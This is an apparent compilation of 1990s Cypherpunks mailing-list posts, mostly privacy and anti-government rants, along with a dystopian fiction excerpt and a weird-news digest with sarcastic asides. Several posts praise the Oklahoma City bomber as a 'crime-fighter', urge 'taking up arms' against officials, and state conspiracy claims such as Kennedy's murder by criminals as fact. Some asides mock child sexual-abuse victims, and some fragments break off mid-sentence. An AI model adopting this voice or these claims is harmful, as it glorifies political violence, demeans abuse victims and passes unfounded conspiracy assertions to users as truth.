and the bewitchment of 'prime time,' we are fed our opinions and our
world-views in catch-phrases and ten second sound-bytes. At the same time, Gomez sees to it that there is enough trouble and
turmoil in the world that the World Leaders, even in democracies, can
chip away at human and individual rights under the guise of dealing with various 'threats' that they, themselves, have concocted as a means of retaining power over the masses. Even as the governments of the world strive to bring everyone and everything, however minute, under tight control and regulation, Gomez and the Dark Allies are behind the scenes, helping to guide the development of a technology that will, along with television, be the
ultimate weapon in their struggle for the domination of all mankind--the
The rich and powerful have managed to lull us to sleep with the hypnotizing power of television---stealing our thoughts and our reasoning processes in our slumber, feeding us our reality via the airwaves...according to the 'official' party line. The government and the media have placed us on neat little shelves where we are numbered and labeled according to their own wants and needs. We are allowed the illusion of freedom of thought, and individual
choice, as long as we have our 'Freedom of Thought Permit 1136.51.709'
and don't stray too far from the permitted paths. In the great battles of the past the Dark Forces have always been beaten by the individuals scattered in the secret places, living unnoticed in obscurity. Living quietly and unobtrusively, forgotten about in the madness storming the land, they have kept alive the spark
of Thought and Reason. They were able to go quietly about their work, making contact with the individuals who were ready to escape the madness
and work towards restoring Sanity in the land.
This time there will be no escape. Every man, woman and child on the face of the earth will have a dossier documenting their life from the time of their arrival on the face of the planet.
Information gleaned from the Department of Motor Vehicles, their Social
Security Number, banks, credit cards, magazine subscriptions, charitable

When Gomez removes the masks of his human allies, revealing them as dark agents who have been rewarded with wealth and power for doing the bidding of the Evil One, the names of the misfits and wrong-thinkers will be spit out of the computers at the speed of light---to be rounded
up and disposed of in the opening salvo of the new Holocaust. Only then will the final Battle of Armageddon begin, ravaging the face
of the earth and devouring humanity; bringing total control of humankind
under the Dominion of the Evil One, with nobody but the Waking Dead left
to carry on the human race.           ***     ***    ***
{Excerpt from "Webworld" (c) 1997, Pearl Publishing}
        Prologue to 'WebWorld & The Mythical Circle of Eunuchs'
The great tragedy of it, is that it didn't have to happen. Not at all...we were warned.
And yet, still, it has come to this. I don't know why I feel this overwhelming compulsion to go on and on about it. I could have done something.
We all could have done something.
Perhaps the final epitaph on the gravestone of Freedom will be, "Why didn't somebody _do_ something?" That seems to be the common battle-cry of the legions of humanity that have been sucked into the vortex of the New World Order.
None of the imprisoned seem to know that the very phrase itself is reflective of the source of their imprisonment...that this desperate cry of anguish is in no way an antidote for the terrible disease that
has afflicted 'Liberty and Justice', and that it is, rather, merely the
final symptom of the cursed blight itself. I can hear the rumbling of the trucks as they come up the street, and soon I will be hearing the thumping of the jackboots storming up the
staircase, as I have heard them so many times before. But I suspect that this time, the sound will be different, that it will have an ethereal quality about it, one which conveys greater personal meaning
than it did when I heard it on previous occasions.
This time, they are coming for me. My only hope, is that I can find the strength of character somewhere inside myself to ask the question which lies at the heart of why there
is a 'they' to come for me at all...why, in the end, it has finally come to this for me, as for countless others. The question is, in retrospect, as simple and basic as it is essential
for any who still espouse the concepts of freedom and liberty to ask themselves upon finding themselves marveling at the outrageousness being perpetrated upon their neighbors by 'them'...by 'others'...by 'Friends of the Destroyer.'                                  The question is:
                            "Why didn't _I_ do something?"

Dear Mr. & Ms. G. Embassy,
  Perhaps you've forgotten why freedom lovers kicked your ass in
"The Big One."
  Far be it from me to rain on your jackboot parade, but this time
the underground was put in place long before the war on freedom and
liberty was officially announced.
  XS4ALL's efforts to allow citizens to have the information needed
to interfere with train schedules to Auschwitz was just the tip of
the iceberg. Strong encryption and anonymous remailers are likewise
only visible symbols of the electronic weapons that have already been prepared in defense of free speech, privacy and freedom.
{Fool me once...}
  If you are of the mistaken notion that the rise of fascist limits
on freedom in now laughably democratic countries around the world
indicates that the world is now in alignment with the goals of a
"Fourth Reich"/"New World Order", then you are in for a very rude
  The fact of the matter is that Germany is not only sucking on
hind-tit in terms of being far behind the designers of the internet
in controlling the worldwide flow of information, but all those
whose aim is to use information control to futher the purpose of
domination and oppression are sucking hind-tit to those who are
prepared to prevent this from coming to fruitation.
  Long before the "Internet" and the "World Wide Web" were being
publically touted as the "Information Highway" of the future, citizens throughout the Internet were being organized into small,
disparate cells for the purpose of educating and preparing them
to provide an underground resistance to the fascist designs of
those who fully intended from the start to use this technology
as a weapon against freedom and liberty.
  If you wish just the slightest taste of what I am speaking about,
then read "The Xenix Chainsaw Massacre" or "Webworld & The Mythical
Circle of Eunuchs" at   If you would rather access it from a Soviet source, then I suggest
you try     Or you can find it in France, Australia, Great Britain, China,
Burma, Africa, South America, ad infinitum...as part of a trilogy
named "The True Story of the InterNet."
  If you want a small taste of what lies in wait for fascists in the
Unix Operating system, then study the archives of the "Cypherpunks"
mailing list.
  DOS/Windows? Find the "Secret Gates" mailing list (if you can).
  OS/2, Macintosh OS, Novelle...ask your father and mother, your sister
and brother, your best friend...they may well be among those who have
been preparing for decades to tear down the walls you are only now
preparing to build around freedom and privacy on the Internet.
  If you want a small taste of how your own tools are already being
turned against you, as weapons and munitions, then I suggest that
you try to find the hidden stego in the map of Germany (map2-2.gif)
at the URL for your German Embassy in Canada...
  If, on the other hand, you wish for a small taste of true freedom,
then I suggest that you resist falling prey to the fascist mindset
that others have already decided upon as your ultimate destiny, and
create your own underground resistance cell to fight against the rise
of censorship and the curtailment of freedom and liberty.
{If you haven't already...}

at XS4ALL were reported to be smoking American cigarettes, eating
Hershey's chocolate bars, and chewing gum.

A heartwarming report.
The NSA represents the worst of America: its paranoia, its ruthlessness,
its end-justifies-the-means amorality.  The NSA's personnel policies
reveal its attitudes clearly.
It is ironic indeed that the NSA is being weakened, not by the foreign
enemies it sees behind every curtain, but by the EEOC.  NSA's immoral
and callous mistreatment of employees and its jealous defense of white
heterosexual male privilege have been shielded for far too long behind
the cloak of national security.  An organization which seeks the
darkness so eagerly can only fear the light.
There is no place any longer in the world for an agency like the NSA.
It is an enemy to freedom and an enemy to the free citizenry of its
own country.
We need a new agency, one to defend us against infowar, to help
industrial competitiveness, to assist Americans in retaining their
freedoms rather than attempting to strip them away for its own evil
purposes.  Let us hope that the changing of the guard at the NSA will
lead to a rebirth and a renewal as an agency looking forward, rather
than one concerned only with guarding its own rear.

@_subject: Jim Bell 6 
The right to a speedy trial is next to meaningless in a court system
which is composed mostly of legal bum-buddies whose main concern is to
make as much money as possible without making each other look like
incompetent fools.
  The fact of the matter is, there is seldom any reason for a person
to sit in jail without bond for extended periods other than the fact
that his or her attorney is not capable of trying a case in a reasonable
amount of time.
  Jim Bell is likely suffering from the delusion that his attorney is
working in his client's best interest. If not, he would demand that
the judge appoint an attorney to defend him who is both capable of and
competent enough to represent him in a timely fashion.
  I mean, get real...Bell is imprisoned without bail with no charges
having been filed against him.   Has anybody seen a lawyer-ad on TV lately where the attorney is
screaming, "CALL ME AND YOU'LL ROT IN JAIL WITHOUT EVER BEING CHARGED
WITH A CRIME! CALL 1-800-DIP-SHIT!"
  The bottom line: The fact that a public defender is too busy, or
doesn't have the resources, to represent his client in a timely fashion does not justify abrogation of a citizen's rights.
  The fact that Bell's lawyer is allowing his client to sit in prison
without bail and without an indictment against him, without doing anything about it, suggests to me that he is selling out his client
in order to enhance his future career as a RatFucker.

LEAD STORIES
* Ms. Courtney Mann, the head of the Philadelphia chapter of the
National Association for the Advancement of White People, who is
a tax preparer and single mother, was rebuffed in an attempt to join
a Ku Klux Klan-sponsored march in Pittsburgh in April, according
to the Pittsburgh Post-Gazette.  Though she has been in the
NAAWP for at least four years, the Pennsylvania KKK Grand
Dragon turned her down because Mann is black.  "She wanted me
to send transportation [for the rally]," said the Grand Dragon. "She
wanted to stay at my house [during rally weekend].  She's all
confused, man.  I don't think she knows she's a black."    And we have Kent Crispin. When's the trading deadline?
* April's annual religious fertility celebration in Nagoya, Japan,
designed to improve the rice harvest, featured as usual a 12-foot-
long, bright pink, plastic penis, carried through the street, followed
by displays of smaller organs and a giant banner of a blood-
vesseled penis, testicles, and pubic hair.  Souvenir candy of the
same shape was sold during the event, and at the end of a parade,
the giant organ was placed on the fertility shrine.   Don't they do the same thing in North Dakota?
* In mid-April, five weeks before the national elections, the
governing party in Indonesia announced, via "scientific
calculation," according to one leader, that President Suharto had
won re-election with 70.02 percent of the vote.   There's a standard joke in Mexico about thieves breaking into
a government office and stealing the results of next year's
COURT DOCKET
* In February, Maryland circuit court judge Thomas Bollinger Sr.
agreed to wipe the record clean of Charles Weiner's spousal battery
charge after he completes probation--for the sole purpose of
helping Weiner join the Chestnut Ridge Country Club, which had
until then rejected him because of his criminal record.  (In 1993,
Bollinger gave a rapist probation for an attack against a drunken
woman, remarking that finding an unconscious woman on a bed
was "the dream of a lot of males, quite honestly.")  Four days later,
Bollinger reversed his decision and removed himself from all
domestic violence and sexual offense cases.   Hey! Everyone _knows_ that "snoring" implies consent!
* In Santa Cruz, Calif., in February, Mr. Danis Rivera, 25, rejected
a plea bargain that would have sent him to prison for one year for
having sex with underage girls.  However, at his trial he was in
such a foul mood that he constantly spit at court personnel and
finally had to be outfitted with a Hannibal Lecter-type bonnet over
his face.  He was convicted and sentenced to 16 years in prison. And in a Providence, R. I., courtroom in April, Latin King gangster
George "Animal" Perry, on trial for murder and racketeering and
frustrated at the length of the prosecutor's closing argument, which
denied him a much-needed restroom break, rose from his chair,
unzipped his fly, and took one, anyway.   It seems reasonable that if one petitions the court for relief,
and is denied, then the only recourse is to relieve oneself.
* St. Charles Catholic Church (Picayune, Miss.) and nearby St.
Margaret Mary Church (Slidell, La.) posted security ushers at the
doors in February to make sure that parishioners were not
pocketing communion wafers.  Devil-worshiping ceremonies often
use wafers for symbolic desecration, and when six people were
seen leaving St. Charles in December with their wafers, the
churches' leaders began to fear a local Satanic conspiracy.   Nonsense. They were probably just trading them for drugs and
child pornography.
* In April in Houston, Tex., Robert Perry Russell, Jr., 44, was
sentenced to 20 years in prison for sexual assault and diapering of a
14-year-old boy, but police say the number of victims may have
been as many as 10.  According to police, Russell liked to take
boys out in a boat, tell them a tale about a headless killer seeking to
rescue a toddler from the dangerous lake and who kills all other
people, and suggest that putting on the diapers he happens to have
with him would be a good way, should the killer appear, of
convincing him of his toddler status.   And, as compensation for their pain and suffering, the victims
accepted the deed to Russel's prime real estate in Florida and
a bridge in the New York area.
DANGEROUS ACTIVITIES
* Dishwashing:  In March, a busboy at a Key West, Fla., Marriott
resort allegedly shot and killed a supervisor who had apparently
made some constructive criticism of the busboy's loading of the
dishwasher.  And in May, police in Helena, Ark., detained a 15-
year-old boy they suspect shot his older sister to death after a
dispute over which one would wash the dishes.   I'll wash, you die.

Legislators should be made to vote with their dicks hanging out.
Any legislator with fresh lipstick on his dick gets his vote thrown
out. It may not be a perfect system, but I wouldn't bet against it
being better than what we have now.
  The "classified briefing" by LEA smells like a classic example of
"Of course, if you vote against this bill then we will be forced to
expose you as a champion of pedophiles and drug czars."
  So you're sitting there at the police computer, checking out Dahmer's
floppies, which contain only letters to his mother, and you realize that
if they are encrypted, then they are proof that he has something
to hide. Hmmm...
  Or you realize that the Judge will imprison Tim May for contempt of
court until he provides his secret key, and you realize that if it is
encrypted with a key Tim doesn't have, that the Judge will have to
decide whether to believe the outrageous accusations of Tim May, Jim Bell's best friend (according to a reliable informant), against a
champion of law enforcement.
  There are times that I wish Tim was a little less perceptive. It would
give me a little room for self-deception when I need to take a break
reality and try to tell myself that there is some slim ray of hope for
freedom and liberty to prevail.
  Why is it that the "stampede" always seems to manage to head in the
direction needed to trample the constitution underfoot (like tornados
sniffing out trailer parks)?
SEN. JOHN ASHCROFT (R): Emerged as a staunch
crypto-defender.   I originally thought that perhaps he was taking this stance as a
matter of principle, but then I heard that he had purple lipstick
on his dick.

if the bill happened to be defeated by a substantial margin, I

  I always had my suspicions that the main person using the TruthMonger
multi-user persona on the CypherPunks list was acting out of some kind
of obsessive, guilt-driven psychosis as a form of repentance for great
evils being commited under his true identity.
  Chretien, as Prime Minister of Canada, has to live with the knowledge
that in order for his country to survive he needs to kowtow to a gang
of criminals in a neighboring country who have the firepower to smoke
the Canadians' butts in a heartbeat.
  The TruthMonger posts are more sporadic when Chretien is involved in
international conferences, and it is now obvious that the pressure of
living a lie builds up and spills out at these times when he cannot
relieve himself of his guilt using his TruthMonger posts.
  I suspect that Belgian Prime Minister Jean-Luc Dehaene is Rabid Wombat

the list as Dr. Dimitri Vulis, KOTM.

  Unfortunately, he didn't have the political balls to testify for the

  What the fuck is wrong with the American people?
  Here are three world-leaders who openly acknowledge that the U.S. is
in the hands of gangsters who would be imprisoned for crimes against
the citizens and the country if justice truly prevailed in America. And
a single conversation, accidentally(?) revealed such as this one, is no
doubt just the smallest of samples of the stinking rot that lies at the
heart of a gang of criminals who are actively working to subvert the
constitution of the country in the interests of furthering their ever-
tightening, fascist grip on the reins of power.
  The same government which trained Timothy McVeigh to kill (and then
fucked over his Desert Storm compatriots when their service to their
country cost them their health) used their trained, "it's all there in
the press release" news dogs to turn their own penny-ante hired gun
into a "monster" symbolizing patriotic paramilitarists whose concern
lies with defending America at home rather than murdering foreigners
for "votes."
  Slipping in the polls because you murdered and fucked over too many
of your own citizens? Whack out a pile of worthless foreigners with
high-tech weapons that allow us to slaughter them wholesale without
losing any American lives. Watch your poll stats rise as Americans stand
and cheer the murder of defeated, retreating troops by aircraft missles
which weren't designed to take prisoners.
  Act surprised when 800 government law enforcement agents with the latest in technology claim to be unable to prevent men, women and children that were victims of a botched government assault from dying
a horrible, burning death. Act outraged when the chickens come home to
roost in Oklahoma City.
  The reason they are not in prison here is because they are armed
and dangerous and have managed to disarm and disenfranchise their
citizens, making any resistance to government fascism a criminal   We get to vote for the criminal of our choice from among the
group of criminals that the other criminals pre-select for us
and whose campaigns they support with our stolen booty.
  If a "ringer" slips through, such as Kennedy, he is murdered
and the criminals make a great show of patriotic mourning. If
a no-name schill is foisted on the public as vice-president,like
Agnew, and will take power because the "gang leader" is getting busted,
remove him on the basis of what are "parking tickets" compared to the
crimes of most of your cronies.
  World-leaders recognize that the American citizen is just a stupid
'mark' who is getting fucked in a sophisticated con by men who have no
qualms about stealing senior citizen's life savings (Social Security)
stealing votes and elections (bribery, sabotage and power mongering),
and stealing the rights and freedoms of the citizens by lying about
the need to stop illegal drugs (which remain freely available no matter
how many of our rights and freedoms are stripped).
  I don't have a death-wish of any sort, but if I happen to get killed
by someone striking back at the enemies of freedom who are usurping the
constitution to tighten their criminal control over the citizens, then
I can think of far worse reasons to die.
  We lose 169 people every time a bean-counter decides it's cheaper to
pay off the families of the dead instead of spending an extra nickle
on every seat-belt installation in an automobile. We lose 169 people
every time some Senator decides we need a new weapons system instead
of new hospitals or medical services. We lose 169 people every time
the President decides to stomp on the citizen's rights instead of
giving them enough freedom to feel like they can face life without
numbing their senses to the stench around them with ever-increasing
amounts of narcotics.
  Gambling is a government-regulated criminal enterprise, now, and
Timothy McVeigh's ante was just to establish that the citizens are in
the game. I wouldn't be at all surprised to see some heavy betting taking place from all the players who choose to "sit in."
  American sheeple may regard McVeigh as a "monster," but world-leaders
make a strong case for viewing him as a "crime-fighter."

Duncan, as he often does, points out a small truth which goes
to the very heart of the issue of criminalizing strong encryption.
  Criminalizing crypto is criminalizing _private_speech_ and also
  Mark my words, when the day comes that LEA's have the technology
to read human thoughts, then we will be seeing this same debate taking place in that arena. The "legitimate needs of law enforcement"
rhetoric, et al, will be drug out for the billionth time to thwart
the danger that a CypherPunk might fart in the woods without an
LEA recording it.
  Think back to the first time you read "1984" and think about what
you, yourself, could _add_ to the book from your own personal
knowledge and experience since that date.
  If we added all of the instances of "Big Brother" becoming an
accepted reality of everyday life since then, the tome would rival
"War and Peace" in volume and scope.
  If I choose to write my prayers on a word processor, in order to
better organize my spiritual thoughts and be able to reference them
to remember my promises to God, does the State have a right to
demand I let them view those prayers, and private religious thoughts?
  If I use a computer to write my attorney, perhaps even outlining
my activities, etc., in regard to criminal charges against me, does
the State have a right to demand access to it?
  Am I allowed to whisper to my lawyer in court, but not to type
what I want him to know on a computer screen he has in front of
him in the same courtroom?
  Am I allowed to tell a $200/hour psychiatrist that someone made me
mad enough to "kill" them in order to stay sane enough not to do so,
and have it kept confidential, but be denied the right, if I am a
poor person, to do the exact same thing in writing on my computer,
with the help of a $4.95 paperback self-help/psychology book?
  Have private thoughts been "corporatized/governmentized" somehow?
Are our private thoughts sacred only when shared with a recognized
authority? If I share them with myself, do they become the property
of the State?
  Am I totally out of my mind, or has life become tremendously
fucking scary, and nobody but me has noticed?
  Sometimes I feel like the guy on the plane in the "Twilight Zone"
movie, who is the only one who can see the monster on the plane's
wing that is endangering everyone's life. And if you shoot at the
monster nobody else can see, then they strap you down and take you
to the rubber room. (Obvious analogy to McVeigh and Death Row purely unintentional.)
  {"Your honor, this search warrant is for the purpose of cracking
the suspect's head open with a crowbar and prying his brain out so
that we can poke around, in _good_faith_, I assure you, and look
for evidence that pertains to a crime that may have been committed.")
  If you don't provide a breathalyzer sample, you are automatically
guilty of drunken driving (even if the DMV License Tester is handing
you a perfect score/report as the officer places you in handcuffs).
  I have no doubt that under future key escrow laws that your prayers
to God and your letters to yourself detailing the most intimate details of your life will make you automatically guilty of tax evasion
unless you allow strangers who are hostile to you (police, judges,
prosecutors) to read them.
  Yes, and one day, even our private thoughts will be considered to
automatically make us guilty criminals unless we allow LEA's access
to them. (The "lie detector" is a case in point, and it has in the
past come dangerously close to being afforded the same status as
the breathalyzer, even though it represents "voodoo" as much as it
does "science.")

and sell my drugs before the date I'm due to appear in court, but
I keep getting in trouble because I just can't keep up with all of
the intricate details involved in being a law-abiding citizen.
  What happened to the "good old days" when all you had to do was
stay out of stone-throwing range of the "righteous" in order to
live according to your own dictates?
  Today, the "righteous" feel that they have the right to come
in your home whenever they want, demand the wrong to read all of
your correspondence, tell you what you can put on your website,
limit what thoughts you can express and how you do so.
  And it never ends. If you want to build a dog-house you have to
deal with an army of people who are upholding the "righteousness"
of city permits, union rules, ecology regulations, tax laws, and
a multitude of similar bullshit. And if you happen to forget to
cross a 't' or dot an 'i', then you find you are in violation of
a new law which is classified as an "inconsequential felony."
Def. 'inconsequential felony' -- A legal term which refers to
a harmless action which is nonetheless subject to the severest
of punishments because someone in authority got a wild-hair up
their ass for some silly reason and deemed it should be so.
  I met a man in Texas who spent twenty years in prison for the
possession of a few stems and seeds. He thought it ironic that
the state had imprisoned him for twenty years to try to prevent
him from doing something that someone else thought would ruin
his life.
  He told me that at his sentencing, his mother told him, "I told
you smoking dope would ruin your life." She got upset when he was
"unrepentant" enough to reply, "No. I think the judge did that."
  The problem is not that the citizens are "sinners" but that
Hatch and his ilk are "righteous." When the "righteous" take it
on themselves to speak for a "higher power," whether it be "God"
or "National Security," then they begin justifying even the most
horrendous of actions as "just following orders."
  Thus, it's not really going to matter whether you are using crypto
to encrypt children's pictures or a new version of the Bible. Coming
new laws will make you a criminal either way, because the "righteous"
feel that it is up to them to decide if the children's pictures are
pornographic or if the new version of the Bible is sacreligious.
  Government has merely usurped religion as the final authority on
who is "righteous" and who is a "sinner," on what is "good" and
what is "bad." They are priests with nuclear weapons to back them
up in enforcement of their "commandments."
  The end result is that we have to fear getting nuked if we build
the fence around our house more than 5' high, so that the ever-
vigilant "righteous" don't hurt themselves when peeking over our
fence to see if we've built an illegal doghouse. And we have to
fear getting nuked if we want to electronically "whisper" when
the "righteous" are trying to spy on the "sinners."
  Same shit, different religion.

@_subject: Jerry Springer Crypto Special 
Sitting at home this morning I decided to turn the TV to the Jerry
Springer show, assuming that, since his network was trying to promote
him as a News person, his show would no doubt be dealing with a serious
issue such as the future of the InterNet, encryption, censorship, etc.
  Instead, the show turned out to be titled, "I Cut Off My Manhood." It
was a delightfully artful mosaic about a guy who cut off his penis with
gardening shears, the queer stalker who had killed the penisless guy's
cat by throwing a recliner across the room, the stalker's lesbian friend
and two fairly average relatives of the self-mutilater who apparently were there to confirm for us that cutting off one's penis with a pair
of gardening shears is a bit over the edge, to say the best.
  Although I was disappointed in that encryption issues were not being
addressed on the show, I did get somewhat enlightened as to what we
can do to help spread strong encryption.
  The Jerry Springer audience got to see pictures of the mutilated penis
(I assume in close-up color glossies) while those of us at home had to
be content to watch the audience members groan and try not to throw up.
I immediately realized that if the show had been on WebTV and pictures
of the mutilated penis were available to home viewers in encrypted form,
that "Applied Cryptography" would soon be on the Best Seller lists
around the nation.
  Thinking about crypto issues from the standpoint of female body parts,
I realized that GAK and Key Recovery are likely to become a part of our
everyday reality because Silicon Valley Crypto has the same allure as
Silicon Breasts.
  We live in a bottle-fed society that has learned from infancy to
accept substitutes for the real thing. From topless bars to the beach,
we are willing to settle for the illusion that matches the advertised
product our minds have been sold, rather than accept the forms that
exist in reality and take the time and effort to find ones that truly
suit our needs and desires.
  Is a society that eats food that sometimes has less nutritional value
than the package it comes in, are the masses going to demand "the real
thing" in a crypto product, or will they settle for a watered down
product which "meets government standards" and comes in a pretty box?
  The masses don't have the time or expertise to test the nutritional
value of their food or the security of their crypto. They depend on
the government, corporations and the press to provide them with the
products and information to make a rational choice as to what truly
meets their needs.
  The government's main interest is power over the citizens; the
corporation's main interest is profiting from the citizens; the press'
main interest is pandering to government and corporations enough to
be kept from getting cut "out of the loop" of money and power.
  The only hope the masses have of getting anything resembling a square
deal in regard to the products and information they are fed is for
there to be enough individuals within the government, corporations and
the press who are willing to resist the mindless, self-perpetuating
evolution of these non-human entities, and make an effort to provide
products and information which have real value based on the goals which
they are designed and advertised to meet.
  There was a discussion on the list as to whether the cypherpunks who
have "gone corporate" are a blessing or a curse to the spread of strong
crypto. I think that the answer lies in the individual and in the final
product of their efforts.
  Perhaps crypto needs Colonel Tom Parker to promote it, with Barnum and
Baily bringing the Silicon Rockettes to town to give away pictures of
of a mutilated penis which can only be viewed using a strong crypto
product. ("As seen on the Jerry Springer show!")
  The Dark Forces are making a concerted bid to set the direction and
the tone of crypto debate and crypto development in a manner which will
lead to the negation of the constitutional right to have our freedom and our privacy unfettered by government intrusion.
  It is not government, nor corporations, nor the press, who ultimately
decide whether our freedom and privacy will be maintained or whether it
will be compromised. It is the individuals who make a decision whether
to go along with the abrogation of our rights in their own individual
self-interest, or whether they will speak out and/or resist those who
put the goals of organizations over the interests of the people.
  Our government and our society are being directed by manipulation of
the same mob mentality that is in evidence on the morning talk shows.
The voice of reason gets shouted down unless there are enough people
who realize that the answer to noise is more noise.
  The greater the position and authority of an individual, the more
noise they are able to make to counter the efforts of those who are
attempting to work the mob into a frenzy for their own aims. Thus
the greater is their responsibility to act in the long-term interest
of freedom. At the same time, unless there are people of conscience
at every level of government, corporation and society who are willing
to take a personal stand, and to support those in higher positions
who take a stand, then freedom is doomed.
  There is a Swiss bank security guard who discovered bank records
about to be shredded which detailed the accounts of Jews who were
victims of the Holocaust. He chose to resist "going along" with the
government laws, corporate rules, and societal taboos against making
a decision based on one's own conscience, and he "stole" the records
in order to prevent them from being destroyed.
  He was threatened with death, prosecution, had to leave his home
and country behind and faces an uncertain future.   There is a cost to resisting the fascism of organizations and of
society itself, and the less that resistance is spread among us,
then the greater the cost that each of us has to bear.
  Resist. Make noise.
  The freedom you save could be your own.

You are both right.   Strong crypto will obstruct LEA's from doing the *millions* of

from LEA-originated to criminal-originated, which is the way God has

  If we are going to play good-guy/bad-guy, there ought to be a real
difference between the two. Kids on a playground know that much.
  Attitudes like this are the cause of the erosion of our freedom and

guilty child molester to go free."   Why do we never hear anyone saying "Sure, the legal system just
fucked me silly and unjustly ruined my life, but it is 'still overall
of use to the public'."? The reason is that a roll of the dice isn't
good enough when it comes to *ourself* receiving justice.
  Anyone who is comfortable for a roll of dice to decide the justice
received by *the other guy* is a fool and your enemy.
  Bullshit. The current hot-ticket item in Canada is video of the girls
being tortured, raped and murdered by Paul Bernardo. These videos are
coming from the people involved in his prosecution and imprisonment.
  Are the TV networks cooperating with criminals by profiting from the
pictures of the OKC bombing, etc? Their extensive coverage certainly
makes such actions a good public forum for the potential terrorist.
  I have no doubt that Paul would love to do so, if it weren't for the
fact that he would be subjected to imprisonment and lawsuits if he took
action to protect his home and property from intruders during his absence and some ignorant thief got himself hurt or killed.
  Legislators and LEA's bemoan the fact that the constitution ties
their hands in fighting crime, but the fact is that they are creating
a mountain of new crimes through legislation and stings instead of
putting their effort into dealing with real, existing crime.
  Miscarriage of justice is the rule of the day in the current legal
system. The fact that the reins of power and control of the media is
not in the hands of the poor, minorities, and social outcasts means
that those who are busy participating in and/or supporting the gross
miscarriages of justice are those who paint the system's public face.
  Not as long as you willing to settle for corruption of justice and
the compromise of freedom being justifiable as being of "overall of
use to the public."
  I don't choose to sell my weapons and walk around with a "kick me"
sign on my back, trusting in strangers to defend my life and liberty.
I resent those who choose to do so intimating that I am some kind of
lunatic/radical for choosing to take personal responsibility for
defending my life, liberty and beliefs.
  I am not against joining with others in forming organizations which
are of mutual benefit to all. I am merely against these organizations
being in the hands of self-serving criminals who want control over
all of my movement and communication in order to guard their usurped

the (unarmed) citizens. By then, I am sure the citizens will protest very little when the government decides that cameras are
needed in every home to fight "drug dealers and child pornographers."
  The U.S. is now inundated with a plethora of "Good Cop" shows and
an increasing variety of "Dumb Criminal" video shows, including a
few specials that are blatantly geared to spread the message, "The
Surveillance Camera Is Your Friend!"
  This is not the result of happenstance. The whitewashing of LEA's
and other government agencies, as well as the promotion of the belief
that Constitutional rights are our enemy (and the friend of crime),
are the result of conscious, active direction on the part of those
in power.
  This type of thinking is exactly the reason that government
interests lie in creating more crimes and more criminals.
  Since an ounce of good marijuana costs $300.00 instead of merely
$3.00, it is profitable to not abide by the law. Since it is also
cause for imprisonment, it makes it worthwhile to use violence in
order not to get caught with it. Under the "life imprisonment for
a third felony" laws, you might as well rob and kill someone as
write them a $1.00 bad check (or be better off, in some states).
  If so, then consider feeling ashamed *now* for that fact that your
lack of attempt to protect your rights, and other's rights, is causing
the death of innocent people because security against those who want
their freedom has been increased.
  Both the U.S. and Britain send armed thugs to foreign soil to force
their citizens to live according to our belief in what is right, and
then we call them *terrorists* when they respond to armed force with
armed force.
  With the use of radar to create "speed traps," government realized
the profits to be had from *creating* crime and they have never
looked back.
  I have no doubt that the surveillance industry will prove every
bit as profitable as the prison industry, and just as easy to sell
to a citizenry that is being frightened and held hostage by a
government which should be protecting them and helping them to
protect themselves.
  Save your "In order to save the patient, we had to kill him."
laws-and-technology speech for forums where freedom and privacy
are considered less precious than comfort and security.

@_subject: White House "kinder, gentler"-CDA 
I don't see Cypherpunks being naieve about the need to compromise in
order for people to live together, but I think Cypherpunks recognize the difference between things which are inviolate and those which are not.
  e.g. - A group of people in a liferaft with food and poison.
  Debate over how much each of us can eat from a pool of food held in
common may be open to compromise, but debate over whether any individual
can-or-cannot-or-*must* eat poison to end suffering or "for the good of
the collective" should *not* be open to compromise of the individual's
right to self-determination.
  The problem is that the "solution" to every "problem," in the eyes of
LEA's and the legislature, is to compromise rights and freedoms that are guaranteed by the Constitution.
  The problem is that many of the purported "problems" involve people
passing judgement on the interests and actions of others and their
"solution" is to criminalize other's actions on the basis of their own
sense of guilt and shame.
  The problem is that those promoting "compromise" often have an agenda
that is based on a series of compromises leading to complete abrogation of the other's position. {A prime example is the "compromise" of making
already-legal crypto "legal" in return for agreeing to criminalizing
other currently legal actions.)
  If you are taking a reasonable, rational stance on issues and are
marginalized or cut out of the loop in order for the government to
disenfranchise your constituents, then you can serve your constituents
by taking up arms against the criminals who are subverting the will
of the people.
  Duh... I certainly hope you are talking about giving up your *own*
fundamental liberties to remain in "the game" (which you have every
right to do). However, if you are indeed representing constituents
(or readers), then you are also giving up their liberties, as well,
to a certain extent.
  I think you need to do some serious thinking about the difference
between compromising in order to defend a position and compromising
in order to "remain a player in the game."
  If you are not strong enough to defend a position of principle
and survive, then you should not be the one "in the game" defending
that position. The ACLU and the NRA "marginalize" and "compromise"
themselves, it is not the government, the public, or their members
"doing it *to*" them.
  As far as I am concerned, what compromises you make in order to
remain in a position to report on the beltway is your own decision
to make. I just hope you have the wit and wisdom to walk with the
Devil only as far as the bridge, because he always burns it behind
him, and few make it back.

ANNOUNCEMENT FROM THE EUROPEAN UNION COMMISSIONERS
An agreement has been reached to adopt English as the preferred
language for European communications, rather than German, which was the
other possibility.  As part of the negotiations, Her Majesty's Government
conceded that English spelling has some room for improvement and has accepted a five-year phased plan for what will be known as EuroEnglish
(Euro for short).
In the first year, "s" will be used instead of "c".  Sertainly sivil
servants will resieve this news with joy.  Also, the hard "c" will be
replaced with "k".  Not only will this klear up konfusion, but komputers and typewriters kan have one less letter.
There will be growing publik enthusiasm in the sekond year, when the
troublesome "ph" will be replaced by "f".  This will make words like
"fotograf" 20 per sent shorter.
In the third year, publik akseptanse of the new spelling kan be expekted to reach the stage where more komplikated changes are
possible.  Governments will enkorage the removal of double letters, which have always ben a deterent to akurate speling.  Also, al wil agre that the horible mes of silent "e"s in the languag is disgracful, and they would go.
By the fourth year, peopl wil be reseptiv to steps such as replasing "th" with "z" and "w" with "v".
During ze fifz year, ze unesesary "o" kan be dropd from vords kontaining "ou", and similar changes vud of kors be aplid to ozer kombinations of leters.

@_subject: Anonymous virtual networks 
What if people were to create virtual machines (eg Java or whatever) which
were accessible to anyone on the internet, and linked them together in a
virtual network.  CPU-time and bandwidth on the virtual machines could then
be sold (or more likely bartered).
The network would be self-contained, so nobody outside the virtual network
would see it.
So, when one wants to send some anonymous messages, just buy or trade for
some processor time and disk space somewhere, then mail in a remailer
program and it'll run.  When it runs out of cpu-time credits, it just gets
deleted.  (The machine owner would have little reason to keep it around,
since it is more economically profitable to lease the disk space to
someone else rather than try to decrypt old remailer traffic, which would
likely be a futile effort, given enough layers of encryption)
So let's say we agree I'll give you 10 mips-years of cpu and 10 MB disk
space and 100 MB of network traffic on my machine, and you give me the same
on your computer.  I then trade some of the CPU time & disk space on your
machine to Joe, who uses it to set up some remailers.  Joe then sells
remailer services to some newbies.  After their pre-paid remailer cards run
out then Joe's remailer has used up all his CPU-credits on your machine and
